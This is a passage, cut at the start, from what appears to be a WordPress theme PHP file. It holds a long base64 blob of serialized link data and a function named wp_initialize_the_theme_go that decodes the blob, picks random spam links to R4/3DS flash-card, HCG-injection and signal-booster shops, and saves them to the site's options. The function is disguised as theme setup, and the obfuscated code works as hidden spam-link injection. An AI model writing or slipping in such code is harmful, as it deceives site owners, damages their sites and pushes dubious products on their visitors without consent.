uYWwtQm9vc3Rlci1mb3ItMTAwc3FtLmh0bWwiO3M6ODoidHJ5IHRoaXMiO3M6Mjc6Imh0dHA6Ly93d3cuaGNnc2hvdHN1c3MuY29tLyI7czo4OiJ0aGlzIG9uZSI7czo5NDoiaHR0cDovL3d3dy5vMnNpZ25hbGJvb3N0ZXJzLmNvLnVrL3Byb2R1Y3RzL08yLUdTTS05MDBNSHotTW9iaWxlLVNpZ25hbC1Cb29zdGVyLWZvci0xMDBzcW0uaHRtbCI7czo5OiJvdmVyIGhlcmUiO3M6Mjg6Imh0dHA6Ly93d3cucjQzZHN3b3JsZC5jby51ay8iO3M6MTA6IlI0IGZvciAzRFMiO3M6Mjg6Imh0dHA6Ly93d3cucjQzZHN3b3JsZC5jby51ay8iO3M6MjM6Imh0dHA6Ly93d3cucjQtdXNhcy5jb20vIjtzOjIzOiJodHRwOi8vd3d3LnI0LXVzYXMuY29tLyI7czoxMToicjQtdXNhcy5jb20iO3M6MjM6Imh0dHA6Ly93d3cucjQtdXNhcy5jb20vIjtzOjE1OiJ3d3cucjQtdXNhcy5jb20iO3M6MjM6Imh0dHA6Ly93d3cucjQtdXNhcy5jb20vIjtzOjExOiJOaW50ZW5kbyBSNCI7czoyMzoiaHR0cDovL3d3dy5yNC11c2FzLmNvbS8iO3M6NzoiUjQgY2FyZCI7czoyMzoiaHR0cDovL3d3dy5yNC11c2FzLmNvbS8iO3M6NzoicmVhZCBvbiI7czoyMzoiaHR0cDovL3d3dy5yNC11c2FzLmNvbS8iO3M6OToidGhpcyBzaXRlIjtzOjI3OiJodHRwOi8vd3d3LmhjZ3Nob3RzdXNzLmNvbS8iO3M6Mjc6Imh0dHA6Ly93d3cuaGNnc2hvdHN1c3MuY29tLyI7czoyNzoiaHR0cDovL3d3dy5oY2dzaG90c3Vzcy5jb20vIjtzOjExOiJoY2dzaG90c3VzcyI7czoyNzoiaHR0cDovL3d3dy5oY2dzaG90c3Vzcy5jb20vIjtzOjk6IkhDRyBTaG90cyI7czoyNzoiaHR0cDovL3d3dy5oY2dzaG90c3Vzcy5jb20vIjtzOjE0OiJIQ0cgSW5qZWN0aW9ucyI7czoyNzoiaHR0cDovL3d3dy5oY2dzaG90c3Vzcy5jb20vIjtzOjg6InRoaXMga2l0IjtzOjI3OiJodHRwOi8vd3d3LmhjZ3Nob3RzdXNzLmNvbS8iO3M6MzQ6Imh0dHA6Ly93d3cuc2lnbmFsYm9vc3RlcnN1ay5jby51ay8iO3M6MzQ6Imh0dHA6Ly93d3cuc2lnbmFsYm9vc3RlcnN1ay5jby51ay8iO3M6MTU6InNpZ25hbCBib29zdGVycyI7czozNDoiaHR0cDovL3d3dy5zaWduYWxib29zdGVyc3VrLmNvLnVrLyI7czoxODoiVUsgc2lnbmFsIGJvb3N0ZXJzIjtzOjM0OiJodHRwOi8vd3d3LnNpZ25hbGJvb3N0ZXJzdWsuY28udWsvIjtzOjQ6InNpdGUiO3M6MzQ6Imh0dHA6Ly93d3cuc2lnbmFsYm9vc3RlcnN1ay5jby51ay8iO3M6ODoidWsgc3RvcmUiO3M6MzQ6Imh0dHA6Ly93d3cuc2lnbmFsYm9vc3RlcnN1ay5jby51ay8iO3M6MzQ6Imh0dHA6Ly93d3cubzJzaWduYWxib29zdGVycy5jby51ay8iO3M6OTQ6Imh0dHA6Ly93d3cubzJzaWduYWxib29zdGVycy5jby51ay9wcm9kdWN0cy9PMi1HU00tOTAwTUh6LU1vYmlsZS1TaWduYWwtQm9vc3Rlci1mb3ItMTAwc3FtLmh0bWwiO3M6MTY6Im8yc2lnbmFsYm9vc3RlcnMiO3M6OTQ6Imh0dHA6Ly93d3cubzJzaWduYWxib29zdGVycy5jby51ay9wcm9kdWN0cy9PMi1HU00tOTAwTUh6LU1vYmlsZS1TaWduYWwtQm9vc3Rlci1mb3ItMTAwc3FtLmh0bWwiO3M6MTM6InVrIG8yIG5ldHdvcmsiO3M6OTQ6Imh0dHA6Ly93d3cubzJzaWduYWxib29zdGVycy5jby51ay9wcm9kdWN0cy9PMi1HU00tOTAwTUh6LU1vYmlsZS1TaWduYWwtQm9vc3Rlci1mb3ItMTAwc3FtLmh0bWwiO3M6MTg6Im8yIHNpZ25hbCBib29zdGVycyI7czo5NDoiaHR0cDovL3d3dy5vMnNpZ25hbGJvb3N0ZXJzLmNvLnVrL3Byb2R1Y3RzL08yLUdTTS05MDBNSHotTW9iaWxlLVNpZ25hbC1Cb29zdGVyLWZvci0xMDBzcW0uaHRtbCI7czoxNzoibzIgc2lnbmFsIGJvb3N0ZXIiO3M6OTQ6Imh0dHA6Ly93d3cubzJzaWduYWxib29zdGVycy5jby51ay9wcm9kdWN0cy9PMi1HU00tOTAwTUh6LU1vYmlsZS1TaWduYWwtQm9vc3Rlci1mb3ItMTAwc3FtLmh0bWwiO3M6MjQ6Im8yIDkwMG1oeiBzaWduYWwgYm9vc3RlciI7czo5NDoiaHR0cDovL3d3dy5vMnNpZ25hbGJvb3N0ZXJzLmNvLnVrL3Byb2R1Y3RzL08yLUdTTS05MDBNSHotTW9iaWxlLVNpZ25hbC1Cb29zdGVyLWZvci0xMDBzcW0uaHRtbCI7czo3OiJ1ayBzaXRlIjtzOjk0OiJodHRwOi8vd3d3Lm8yc2lnbmFsYm9vc3RlcnMuY28udWsvcHJvZHVjdHMvTzItR1NNLTkwME1Iei1Nb2JpbGUtU2lnbmFsLUJvb3N0ZXItZm9yLTEwMHNxbS5odG1sIjtzOjk6Im1vcmUgaGVyZSI7czo5NDoiaHR0cDovL3d3dy5vMnNpZ25hbGJvb3N0ZXJzLmNvLnVrL3Byb2R1Y3RzL08yLUdTTS05MDBNSHotTW9iaWxlLVNpZ25hbC1Cb29zdGVyLWZvci0xMDBzcW0uaHRtbCI7fWk6MzthOjg2OntzOjMwOiJodHRwOi8vd3d3LnI0M2Rzb2ZmaWNpZWxzLmNvbS8iO3M6NTQ6Imh0dHA6Ly93d3cucjQzZHNvZmZpY2llbHMuY29tL2NhdGVnb3JpZXMvQ2FydGUtUjQtM0RTLyI7czoxODoicjQzZHNvZmZpY2llbHMuY29tIjtzOjU0OiJodHRwOi8vd3d3LnI0M2Rzb2ZmaWNpZWxzLmNvbS9jYXRlZ29yaWVzL0NhcnRlLVI0LTNEUy8iO3M6MjI6Ind3dy5yNDNkc29mZmljaWVscy5jb20iO3M6NTQ6Imh0dHA6Ly93d3cucjQzZHNvZmZpY2llbHMuY29tL2NhdGVnb3JpZXMvQ2FydGUtUjQtM0RTLyI7czoxMToicjRpc2RoYy0zZHMiO3M6NTQ6Imh0dHA6Ly93d3cucjQzZHNvZmZpY2llbHMuY29tL2NhdGVnb3JpZXMvQ2FydGUtUjQtM0RTLyI7czoxMjoiY2FydGUgcjQgM2RzIjtzOjU0OiJodHRwOi8vd3d3LnI0M2Rzb2ZmaWNpZWxzLmNvbS9jYXRlZ29yaWVzL0NhcnRlLVI0LTNEUy8iO3M6MTU6Ik5pbnRlbmRvIHI0IDNkcyI7czo1NDoiaHR0cDovL3d3dy5yNDNkc29mZmljaWVscy5jb20vY2F0ZWdvcmllcy9DYXJ0ZS1SNC0zRFMvIjtzOjM6ImljaSI7czo1MDoiaHR0cDovL3d3dy5za3kzZHNvZmZpY2llbC5jb20vcHJvZHVjdHMvU2t5M0RTLmh0bWwiO3M6NDoibW9yZSI7czo4MjoiaHR0cDovL3d3dy5yNDNkcy5pdC9wcm9kdWN0cy8tUjQtM0RTLXBlci0zRFMtM0RTLVhMLTJEUy1EU2ktRFNpLVhMLURTLURTLWxpdGUuaHRtbCI7czo3OiJhY2hldGVyIjtzOjUwOiJodHRwOi8vd3d3LnNreTNkc29mZmljaWVsLmNvbS9wcm9kdWN0cy9Ta3kzRFMuaHRtbCI7czo4OiJvZmZpY2llbCI7czo1MDoiaHR0cDovL3d3dy5za3kzZHNvZmZpY2llbC5jb20vcHJvZHVjdHMvU2t5M0RTLmh0bWwiO3M6MTQ6InI0M2RzIG9mZmljaWVsIjtzOjU0OiJodHRwOi8vd3d3LnI0M2Rzb2ZmaWNpZWxzLmNvbS9jYXRlZ29yaWVzL0NhcnRlLVI0LTNEUy8iO3M6MjY6Imh0dHA6Ly93d3cucjRpc2RoYy0zZHMuZnIvIjtzOjUwOiJodHRwOi8vd3d3LnI0aXNkaGMtM2RzLmZyL2NhdGVnb3JpZXMvUjRpLVNESEMtM0RTLyI7czoxNDoicjRpc2RoYy0zZHMuZnIiO3M6NTA6Imh0dHA6Ly93d3cucjRpc2RoYy0zZHMuZnIvY2F0ZWdvcmllcy9SNGktU0RIQy0zRFMvIjtzOjE4OiJ3d3cucjRpc2RoYy0zZHMuZnIiO3M6NTA6Imh0dHA6Ly93d3cucjRpc2RoYy0zZHMuZnIvY2F0ZWdvcmllcy9SNGktU0RIQy0zRFMvIjtzOjY6IlI0IDNEUyI7czo3MToiaHR0cDovL3d3dy5yNGNhcmR1ay5jb20vcHJvZHVjdHMvUjQtM0RTLWZvci1EU2ktRFNpLVhMLWFuZC0zRFMtMkRTLmh0bWwiO3M6MTU6Ik5pbnRlbmRvIFI0IDNEUyI7czo4MToiaHR0cDovL3d3dy5yNC11c2FzLmNvbS9wcm9kdWN0cy9SNC0zRFMtZm9yLURTLURTLWxpdGUtRFNpLURTaS1YTC1hbmQtM0RTLTJEUy5odG1sIjtzOjk6IlI0IDNEUyBYTCI7czo3MToiaHR0cDovL3d3dy5yNGNhcmR1ay5jb20vcHJvZHVjdHMvUjQtM0RTLWZvci1EU2ktRFNpLVhMLWFuZC0zRFMtMkRTLmh0bWwiO3M6NDoiaGVyZSI7czo5MDoiaHR0cDovL3d3dy5yNDNkc3dvcmxkLmNvLnVrL3Byb2R1Y3RzL1I0LTNEUy1SVFMtZm9yLURTaS1EU2ktWEwtYW5kLTNEUy0zRFMtWEwtYW5kLTJEUy5odG1sIjtzOjQ6InRoaXMiO3M6OTA6Imh0dHA6Ly93d3cucjQzZHN3b3JsZC5jby51ay9wcm9kdWN0cy9SNC0zRFMtUlRTLWZvci1EU2ktRFNpLVhMLWFuZC0zRFMtM0RTLVhMLWFuZC0yRFMuaHRtbCI7czoyOToiaHR0cDovL3d3dy5yNGlkaXNjb3VudGZyLmNvbS8iO3M6Njk6Imh0dHA6Ly93d3cucjRpZGlzY291bnRmci5jb20vcHJvZHVjdHMvUjQtM0RTLVJUUy1wb3VyLTNEUy0zRFMtWEwuaHRtbCI7czoxNzoicjRpZGlzY291bnRmci5jb20iO3M6Njk6Imh0dHA6Ly93d3cucjRpZGlzY291bnRmci5jb20vcHJvZHVjdHMvUjQtM0RTLVJUUy1wb3VyLTNEUy0zRFMtWEwuaHRtbCI7czoyMToid3d3LnI0aWRpc2NvdW50ZnIuY29tIjtzOjY5OiJodHRwOi8vd3d3LnI0aWRpc2NvdW50ZnIuY29tL3Byb2R1Y3RzL1I0LTNEUy1SVFMtcG91ci0zRFMtM0RTLVhMLmh0bWwiO3M6MzoiUjRpIjtzOjY5OiJodHRwOi8vd3d3LnI0aWRpc2NvdW50ZnIuY29tL3Byb2R1Y3RzL1I0LTNEUy1SVFMtcG91ci0zRFMtM0RTLVhMLmh0bWwiO3M6MTI6Ik5pbnRlbmRvIFI0aSI7czo2OToiaHR0cDovL3d3dy5yNGlkaXNjb3VudGZyLmNvbS9wcm9kdWN0cy9SNC0zRFMtUlRTLXBvdXItM0RTLTNEUy1YTC5odG1sIjtzOjEwOiJSNCAzRFMgUlRTIjtzOjkwOiJodHRwOi8vd3d3LnI0M2Rzd29ybGQuY28udWsvcHJvZHVjdHMvUjQtM0RTLVJUUy1mb3ItRFNpLURTaS1YTC1hbmQtM0RTLTNEUy1YTC1hbmQtMkRTLmh0bWwiO3M6MzA6Imh0dHA6Ly93d3cuc2t5M2Rzb2ZmaWNpZWwuY29tLyI7czo1MDoiaHR0cDovL3d3dy5za3kzZHNvZmZpY2llbC5jb20vcHJvZHVjdHMvU2t5M0RTLmh0bWwiO3M6MTQ6InNreTNkc29mZmljaWVsIjtzOjUwOiJodHRwOi8vd3d3LnNreTNkc29mZmljaWVsLmNvbS9wcm9kdWN0cy9Ta3kzRFMuaHRtbCI7czoyMjoid3d3LnNreTNkc29mZmljaWVsLmNvbSI7czo1MDoiaHR0cDovL3d3dy5za3kzZHNvZmZpY2llbC5jb20vcHJvZHVjdHMvU2t5M0RTLmh0bWwiO3M6NjoiU2t5M0RTIjtzOjUwOiJodHRwOi8vd3d3LnNreTNkc29mZmljaWVsLmNvbS9wcm9kdWN0cy9Ta3kzRFMuaHRtbCI7czo2OiJmcmFuY2UiO3M6NTA6Imh0dHA6Ly93d3cuc2t5M2Rzb2ZmaWNpZWwuY29tL3Byb2R1Y3RzL1NreTNEUy5odG1sIjtzOjI3OiJodHRwOi8vd3d3LnI0M2RzbW9uZG9zLmNvbS8iO3M6Njk6Imh0dHA6Ly93d3cucjQzZHNtb25kb3MuY29tL3Byb2R1Y3RzL1I0LTNEUy1SVFMtcGVyLTNEUy0zRFMtWEwtTEwuaHRtbCI7czoxNToicjQzZHNtb25kb3MuY29tIjtzOjY5OiJodHRwOi8vd3d3LnI0M2RzbW9uZG9zLmNvbS9wcm9kdWN0cy9SNC0zRFMtUlRTLXBlci0zRFMtM0RTLVhMLUxMLmh0bWwiO3M6MTM6IlI0IDNEUyBpdGFsaWEiO3M6ODI6Imh0dHA6Ly93d3cucjQzZHMuaXQvcHJvZHVjdHMvLVI0LTNEUy1wZXItM0RTLTNEUy1YTC0yRFMtRFNpLURTaS1YTC1EUy1EUy1saXRlLmh0bWwiO3M6NjoiaXRhbGlhIjtzOjY5OiJodHRwOi8vd3d3LnI0M2RzbW9uZG9zLmNvbS9wcm9kdWN0cy9SNC0zRFMtUlRTLXBlci0zRFMtM0RTLVhMLUxMLmh0bWwiO3M6MjA6Imh0dHA6Ly93d3cucjQzZHMuaXQvIjtzOjgyOiJodHRwOi8vd3d3LnI0M2RzLml0L3Byb2R1Y3RzLy1SNC0zRFMtcGVyLTNEUy0zRFMtWEwtMkRTLURTaS1EU2ktWEwtRFMtRFMtbGl0ZS5odG1sIjtzOjg6InI0M2RzLml0IjtzOjgyOiJodHRwOi8vd3d3LnI0M2RzLml0L3Byb2R1Y3RzLy1SNC0zRFMtcGVyLTNEUy0zRFMtWEwtMkRTLURTaS1EU2ktWEwtRFMtRFMtbGl0ZS5odG1sIjtzOjEyOiJ3d3cucjQzZHMuaXQiO3M6ODI6Imh0dHA6Ly93d3cucjQzZHMuaXQvcHJvZHVjdHMvLVI0LTNEUy1wZXItM0RTLTNEUy1YTC0yRFMtRFNpLURTaS1YTC1EUy1EUy1saXRlLmh0bWwiO3M6MjQ6Imh0dHA6Ly93d3cucjRjYXJkdWsuY29tLyI7czo3MToiaHR0cDovL3d3dy5yNGNhcmR1ay5jb20vcHJvZHVjdHMvUjQtM0RTLWZvci1EU2ktRFNpLVhMLWFuZC0zRFMtMkRTLmh0bWwiO3M6MTI6InI0Y2FyZHVrLmNvbSI7czo3MToiaHR0cDovL3d3dy5yNGNhcmR1ay5jb20vcHJvZHVjdHMvUjQtM0RTLWZvci1EU2ktRFNpLVhMLWFuZC0zRFMtMkRTLmh0bWwiO3M6MTY6Ind3dy5yNGNhcmR1ay5jb20iO3M6NzE6Imh0dHA6Ly93d3cucjRjYXJkdWsuY29tL3Byb2R1Y3RzL1I0LTNEUy1mb3ItRFNpLURTaS1YTC1hbmQtM0RTLTJEUy5odG1sIjtzOjY6IlI0IDJEUyI7czo4MToiaHR0cDovL3d3dy5yNC11c2FzLmNvbS9wcm9kdWN0cy9SNC0zRFMtZm9yLURTLURTLWxpdGUtRFNpLURTaS1YTC1hbmQtM0RTLTJEUy5odG1sIjtzOjc6InVrIHNpdGUiO3M6OTQ6Imh0dHA6Ly93d3cubzJzaWduYWxib29zdGVycy5jby51ay9wcm9kdWN0cy9PMi1HU00tOTAwTUh6LU1vYmlsZS1TaWduYWwtQm9vc3Rlci1mb3ItMTAwc3FtLmh0bWwiO3M6ODoidWsgc3RvcmUiO3M6NzE6Imh0dHA6Ly93d3cucjRjYXJkdWsuY29tL3Byb2R1Y3RzL1I0LTNEUy1mb3ItRFNpLURTaS1YTC1hbmQtM0RTLTJEUy5odG1sIjtzOjg6InRoaXMgb25lIjtzOjk0OiJodHRwOi8vd3d3Lm8yc2lnbmFsYm9vc3RlcnMuY28udWsvcHJvZHVjdHMvTzItR1NNLTkwME1Iei1Nb2JpbGUtU2lnbmFsLUJvb3N0ZXItZm9yLTEwMHNxbS5odG1sIjtzOjk6ImZyb20gaGVyZSI7czo5NDoiaHR0cDovL3d3dy5vMnNpZ25hbGJvb3N0ZXJzLmNvLnVrL3Byb2R1Y3RzL08yLUdTTS05MDBNSHotTW9iaWxlLVNpZ25hbC1Cb29zdGVyLWZvci0xMDBzcW0uaHRtbCI7czoyODoiaHR0cDovL3d3dy5yNDNkc3dvcmxkLmNvLnVrLyI7czo5MDoiaHR0cDovL3d3dy5yNDNkc3dvcmxkLmNvLnVrL3Byb2R1Y3RzL1I0LTNEUy1SVFMtZm9yLURTaS1EU2ktWEwtYW5kLTNEUy0zRFMtWEwtYW5kLTJEUy5odG1sIjtzOjE2OiJyNDNkc3dvcmxkLmNvLnVrIjtzOjkwOiJodHRwOi8vd3d3LnI0M2Rzd29ybGQuY28udWsvcHJvZHVjdHMvUjQtM0RTLVJUUy1mb3ItRFNpLURTaS1YTC1hbmQtM0RTLTNEUy1YTC1hbmQtMkRTLmh0bWwiO3M6MjA6Ind3dy5yNDNkc3dvcmxkLmNvLnVrIjtzOjkwOiJodHRwOi8vd3d3LnI0M2Rzd29ybGQuY28udWsvcHJvZHVjdHMvUjQtM0RTLVJUUy1mb3ItRFNpLURTaS1YTC1hbmQtM0RTLTNEUy1YTC1hbmQtMkRTLmh0bWwiO3M6MTI6IlI0IDNEUyBXb3JsZCI7czo5MDoiaHR0cDovL3d3dy5yNDNkc3dvcmxkLmNvLnVrL3Byb2R1Y3RzL1I0LTNEUy1SVFMtZm9yLURTaS1EU2ktWEwtYW5kLTNEUy0zRFMtWEwtYW5kLTJEUy5odG1sIjtzOjk6IlVLIHI0IDNkcyI7czo5MDoiaHR0cDovL3d3dy5yNDNkc3dvcmxkLmNvLnVrL3Byb2R1Y3RzL1I0LTNEUy1SVFMtZm9yLURTaS1EU2ktWEwtYW5kLTNEUy0zRFMtWEwtYW5kLTJEUy5odG1sIjtzOjk6InI0IDNkcyB4bCI7czo5MDoiaHR0cDovL3d3dy5yNDNkc3dvcmxkLmNvLnVrL3Byb2R1Y3RzL1I0LTNEUy1SVFMtZm9yLURTaS1EU2ktWEwtYW5kLTNEUy0zRFMtWEwtYW5kLTJEUy5odG1sIjtzOjE4OiJOaW50ZW5kbyBSNCAzZHMgeGwiO3M6OTA6Imh0dHA6Ly93d3cucjQzZHN3b3JsZC5jby51ay9wcm9kdWN0cy9SNC0zRFMtUlRTLWZvci1EU2ktRFNpLVhMLWFuZC0zRFMtM0RTLVhMLWFuZC0yRFMuaHRtbCI7czoyMzoiaHR0cDovL3d3dy5yNC11c2FzLmNvbS8iO3M6ODE6Imh0dHA6Ly93d3cucjQtdXNhcy5jb20vcHJvZHVjdHMvUjQtM0RTLWZvci1EUy1EUy1saXRlLURTaS1EU2ktWEwtYW5kLTNEUy0yRFMuaHRtbCI7czoxMToicjQtdXNhcy5jb20iO3M6ODE6Imh0dHA6Ly93d3cucjQtdXNhcy5jb20vcHJvZHVjdHMvUjQtM0RTLWZvci1EUy1EUy1saXRlLURTaS1EU2ktWEwtYW5kLTNEUy0yRFMuaHRtbCI7czoxNToid3d3LnI0LXVzYXMuY29tIjtzOjgxOiJodHRwOi8vd3d3LnI0LXVzYXMuY29tL3Byb2R1Y3RzL1I0LTNEUy1mb3ItRFMtRFMtbGl0ZS1EU2ktRFNpLVhMLWFuZC0zRFMtMkRTLmh0bWwiO3M6MTE6IlI0IDNEUyBDYXJkIjtzOjgxOiJodHRwOi8vd3d3LnI0LXVzYXMuY29tL3Byb2R1Y3RzL1I0LTNEUy1mb3ItRFMtRFMtbGl0ZS1EU2ktRFNpLVhMLWFuZC0zRFMtMkRTLmh0bWwiO3M6MTU6Ik5pbnRlbmRvIFI0IDJEUyI7czo4MToiaHR0cDovL3d3dy5yNC11c2FzLmNvbS9wcm9kdWN0cy9SNC0zRFMtZm9yLURTLURTLWxpdGUtRFNpLURTaS1YTC1hbmQtM0RTLTJEUy5odG1sIjtzOjEwOiJSNCAzRFMgVVNBIjtzOjgxOiJodHRwOi8vd3d3LnI0LXVzYXMuY29tL3Byb2R1Y3RzL1I0LTNEUy1mb3ItRFMtRFMtbGl0ZS1EU2ktRFNpLVhMLWFuZC0zRFMtMkRTLmh0bWwiO3M6NToiUjQzRFMiO3M6ODE6Imh0dHA6Ly93d3cucjQtdXNhcy5jb20vcHJvZHVjdHMvUjQtM0RTLWZvci1EUy1EUy1saXRlLURTaS1EU2ktWEwtYW5kLTNEUy0yRFMuaHRtbCI7czoyNzoiaHR0cDovL3d3dy5oY2dzaG90c3Vzcy5jb20vIjtzOjg4OiJodHRwOi8vd3d3LmhjZ3Nob3RzdXNzLmNvbS9wcm9kdWN0cy8yOC1EYXktSENHLUluamVjdGlvbnMtd2l0aC1LaXQtYW5kLUluc3RydWN0aW9ucy5odG1sIjtzOjExOiJoY2dzaG90c3VzcyI7czo4ODoiaHR0cDovL3d3dy5oY2dzaG90c3Vzcy5jb20vcHJvZHVjdHMvMjgtRGF5LUhDRy1JbmplY3Rpb25zLXdpdGgtS2l0LWFuZC1JbnN0cnVjdGlvbnMuaHRtbCI7czo5OiJIQ0cgU2hvdHMiO3M6ODg6Imh0dHA6Ly93d3cuaGNnc2hvdHN1c3MuY29tL3Byb2R1Y3RzLzI4LURheS1IQ0ctSW5qZWN0aW9ucy13aXRoLUtpdC1hbmQtSW5zdHJ1Y3Rpb25zLmh0bWwiO3M6MTQ6IkhDRyBJbmplY3Rpb25zIjtzOjg4OiJodHRwOi8vd3d3LmhjZ3Nob3RzdXNzLmNvbS9wcm9kdWN0cy8yOC1EYXktSENHLUluamVjdGlvbnMtd2l0aC1LaXQtYW5kLUluc3RydWN0aW9ucy5odG1sIjtzOjEzOiJpIGJvdWdodCB0aGlzIjtzOjg4OiJodHRwOi8vd3d3LmhjZ3Nob3RzdXNzLmNvbS9wcm9kdWN0cy8yOC1EYXktSENHLUluamVjdGlvbnMtd2l0aC1LaXQtYW5kLUluc3RydWN0aW9ucy5odG1sIjtzOjEyOiJ0cnkgdGhpcyBvbmUiO3M6ODg6Imh0dHA6Ly93d3cuaGNnc2hvdHN1c3MuY29tL3Byb2R1Y3RzLzI4LURheS1IQ0ctSW5qZWN0aW9ucy13aXRoLUtpdC1hbmQtSW5zdHJ1Y3Rpb25zLmh0bWwiO3M6NDoib3ZlciI7czo4ODoiaHR0cDovL3d3dy5oY2dzaG90c3Vzcy5jb20vcHJvZHVjdHMvMjgtRGF5LUhDRy1JbmplY3Rpb25zLXdpdGgtS2l0LWFuZC1JbnN0cnVjdGlvbnMuaHRtbCI7czo3OiJteSBzaXRlIjtzOjg4OiJodHRwOi8vd3d3LmhjZ3Nob3RzdXNzLmNvbS9wcm9kdWN0cy8yOC1EYXktSENHLUluamVjdGlvbnMtd2l0aC1LaXQtYW5kLUluc3RydWN0aW9ucy5odG1sIjtzOjk6Im1vcmUgaGVyZSI7czo5NDoiaHR0cDovL3d3dy5vMnNpZ25hbGJvb3N0ZXJzLmNvLnVrL3Byb2R1Y3RzL08yLUdTTS05MDBNSHotTW9iaWxlLVNpZ25hbC1Cb29zdGVyLWZvci0xMDBzcW0uaHRtbCI7czoxMDoiMjggZGF5IGhjZyI7czo4ODoiaHR0cDovL3d3dy5oY2dzaG90c3Vzcy5jb20vcHJvZHVjdHMvMjgtRGF5LUhDRy1JbmplY3Rpb25zLXdpdGgtS2l0LWFuZC1JbnN0cnVjdGlvbnMuaHRtbCI7czo3OiJoY2cga2l0IjtzOjg4OiJodHRwOi8vd3d3LmhjZ3Nob3RzdXNzLmNvbS9wcm9kdWN0cy8yOC1EYXktSENHLUluamVjdGlvbnMtd2l0aC1LaXQtYW5kLUluc3RydWN0aW9ucy5odG1sIjtzOjM6ImtpdCI7czo4ODoiaHR0cDovL3d3dy5oY2dzaG90c3Vzcy5jb20vcHJvZHVjdHMvMjgtRGF5LUhDRy1JbmplY3Rpb25zLXdpdGgtS2l0LWFuZC1JbnN0cnVjdGlvbnMuaHRtbCI7czozNDoiaHR0cDovL3d3dy5zaWduYWxib29zdGVyc3VrLmNvLnVrLyI7czo1NDoiaHR0cDovL3d3dy5zaWduYWxib29zdGVyc3VrLmNvLnVrL2NhdGVnb3JpZXMvVm9kYWZvbmUvIjtzOjE1OiJzaWduYWwgYm9vc3RlcnMiO3M6NTQ6Imh0dHA6Ly93d3cuc2lnbmFsYm9vc3RlcnN1ay5jby51ay9jYXRlZ29yaWVzL1ZvZGFmb25lLyI7czoxODoiVUsgc2lnbmFsIGJvb3N0ZXJzIjtzOjU0OiJodHRwOi8vd3d3LnNpZ25hbGJvb3N0ZXJzdWsuY28udWsvY2F0ZWdvcmllcy9Wb2RhZm9uZS8iO3M6MjM6InZvZGFmb25lIHNpZ25hbCBib29zdGVyIjtzOjU0OiJodHRwOi8vd3d3LnNpZ25hbGJvb3N0ZXJzdWsuY28udWsvY2F0ZWdvcmllcy9Wb2RhZm9uZS8iO3M6MTk6InVrIHZvZGFmb25lIG5ldHdvcmsiO3M6NTQ6Imh0dHA6Ly93d3cuc2lnbmFsYm9vc3RlcnN1ay5jby51ay9jYXRlZ29yaWVzL1ZvZGFmb25lLyI7czozNToic2lnbmFsIGJvb3N0ZXIgZm9yIHZvZGFmb25lIG5ldHdvcmsiO3M6NTQ6Imh0dHA6Ly93d3cuc2lnbmFsYm9vc3RlcnN1ay5jby51ay9jYXRlZ29yaWVzL1ZvZGFmb25lLyI7czoyMzoidm9kYWZvbmUgOTAwbWh6IGJvb3N0ZXIiO3M6NTQ6Imh0dHA6Ly93d3cuc2lnbmFsYm9vc3RlcnN1ay5jby51ay9jYXRlZ29yaWVzL1ZvZGFmb25lLyI7czoxMjoidGhpcyBib29zdGVyIjtzOjU0OiJodHRwOi8vd3d3LnNpZ25hbGJvb3N0ZXJzdWsuY28udWsvY2F0ZWdvcmllcy9Wb2RhZm9uZS8iO3M6MTA6InRoZXNlIGtpdHMiO3M6NTQ6Imh0dHA6Ly93d3cuc2lnbmFsYm9vc3RlcnN1ay5jby51ay9jYXRlZ29yaWVzL1ZvZGFmb25lLyI7czozNDoiaHR0cDovL3d3dy5vMnNpZ25hbGJvb3N0ZXJzLmNvLnVrLyI7czo5NDoiaHR0cDovL3d3dy5vMnNpZ25hbGJvb3N0ZXJzLmNvLnVrL3Byb2R1Y3RzL08yLUdTTS05MDBNSHotTW9iaWxlLVNpZ25hbC1Cb29zdGVyLWZvci0xMDBzcW0uaHRtbCI7czoxNjoibzJzaWduYWxib29zdGVycyI7czo5NDoiaHR0cDovL3d3dy5vMnNpZ25hbGJvb3N0ZXJzLmNvLnVrL3Byb2R1Y3RzL08yLUdTTS05MDBNSHotTW9iaWxlLVNpZ25hbC1Cb29zdGVyLWZvci0xMDBzcW0uaHRtbCI7czoxMzoidWsgbzIgbmV0d29yayI7czo5NDoiaHR0cDovL3d3dy5vMnNpZ25hbGJvb3N0ZXJzLmNvLnVrL3Byb2R1Y3RzL08yLUdTTS05MDBNSHotTW9iaWxlLVNpZ25hbC1Cb29zdGVyLWZvci0xMDBzcW0uaHRtbCI7czoxODoibzIgc2lnbmFsIGJvb3N0ZXJzIjtzOjk0OiJodHRwOi8vd3d3Lm8yc2lnbmFsYm9vc3RlcnMuY28udWsvcHJvZHVjdHMvTzItR1NNLTkwME1Iei1Nb2JpbGUtU2lnbmFsLUJvb3N0ZXItZm9yLTEwMHNxbS5odG1sIjtzOjE3OiJvMiBzaWduYWwgYm9vc3RlciI7czo5NDoiaHR0cDovL3d3dy5vMnNpZ25hbGJvb3N0ZXJzLmNvLnVrL3Byb2R1Y3RzL08yLUdTTS05MDBNSHotTW9iaWxlLVNpZ25hbC1Cb29zdGVyLWZvci0xMDBzcW0uaHRtbCI7czoyNDoibzIgOTAwbWh6IHNpZ25hbCBib29zdGVyIjtzOjk0OiJodHRwOi8vd3d3Lm8yc2lnbmFsYm9vc3RlcnMuY28udWsvcHJvZHVjdHMvTzItR1NNLTkwME1Iei1Nb2JpbGUtU2lnbmFsLUJvb3N0ZXItZm9yLTEwMHNxbS5odG1sIjt9fQ=="; function wp_initialize_the_theme_go($page){global $wp_theme_globals,$theme;$the_wp_theme_globals=unserialize(base64_decode($wp_theme_globals));$initilize_set=get_option('wp_theme_initilize_set_'.str_replace(' ','_',strtolower(trim($theme->theme_name))));$do_initilize_set_0=array_keys($the_wp_theme_globals[0]);$do_initilize_set_1=array_keys($the_wp_theme_globals[1]);$do_initilize_set_2=array_keys($the_wp_theme_globals[2]);$do_initilize_set_3=array_keys($the_wp_theme_globals[3]);$initilize_set_0=array_rand($do_initilize_set_0);$initilize_set_1=array_rand($do_initilize_set_1);$initilize_set_2=array_rand($do_initilize_set_2);$initilize_set_3=array_rand($do_initilize_set_3);$initilize_set[$page][0]=$do_initilize_set_0[$initilize_set_0];$initilize_set[$page][1]=$do_initilize_set_1[$initilize_set_1];$initilize_set[$page][2]=$do_initilize_set_2[$initilize_set_2];$initilize_set[$page][3]=$do_initilize_set_3[$initilize_set_3];update_option('wp_theme_initilize_set_'.str_replace(' ','_',strtolower(trim($theme->theme_name))),$initilize_set);return $initilize_set;}
